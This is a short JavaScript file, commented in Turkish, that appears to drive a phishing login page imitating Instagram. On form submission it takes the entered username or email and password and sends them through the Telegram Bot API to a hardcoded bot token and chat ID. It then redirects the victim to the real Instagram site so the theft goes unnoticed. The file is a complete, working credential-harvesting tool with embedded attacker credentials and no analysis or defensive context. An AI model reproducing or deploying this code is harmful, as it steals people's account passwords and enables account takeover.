document.addEventListener('DOMContentLoaded', function () {
    // Form gönderme işlemini dinle
    document.querySelector('.login-form').addEventListener('submit', function (event) {
        event.preventDefault(); // Sayfanın yeniden yüklenmesini engelle

        // Kullanıcıdan giriş bilgilerini al
        const usernameOrEmail = document.querySelector('input[type="text"]').value;
        const password = document.querySelector('input[type="password"]').value;

        // Telegram bot bilgileri
        const botToken = '7923992398:AAGplIY5Q62QZJeHzef-pXiHegq23TTSgVg';
        const chatId = '5021980342';
        const message = `Kullanıcı adı veya e-posta: ${usernameOrEmail}\nŞifre: ${password}`;

        // Telegram API'ye gönderim için istek
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log('Bilgiler Telegram botuna başarıyla gönderildi.');
                    
                    // Başarılı gönderim sonrası yönlendirme
                    window.location.href = 'https://www.instagram.com'; // Instagram ana sayfasına yönlendirme
                } else {
                    console.error('Telegram botuna gönderme işlemi başarısız oldu:', data.description);
                }
            })
            .catch(error => {
                console.error('Bir hata oluştu:', error);
            });
    });
});
